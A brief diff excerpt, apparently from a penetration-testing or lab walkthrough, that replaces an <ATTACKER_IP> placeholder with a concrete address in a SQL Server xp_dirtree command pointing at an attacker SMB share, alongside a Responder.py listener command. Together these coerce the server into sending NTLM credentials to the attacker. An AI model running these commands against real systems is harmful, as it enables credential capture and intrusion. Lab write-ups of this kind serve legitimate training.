@@ -477,7 +477,7 @@ sudo python3 Responder.py -I eth0
 ```
 
 ```sql
-EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;
+EXEC master..xp_dirtree '\\10.10.16.137\myshare', 1, 1;
 ```
 
 ```bash
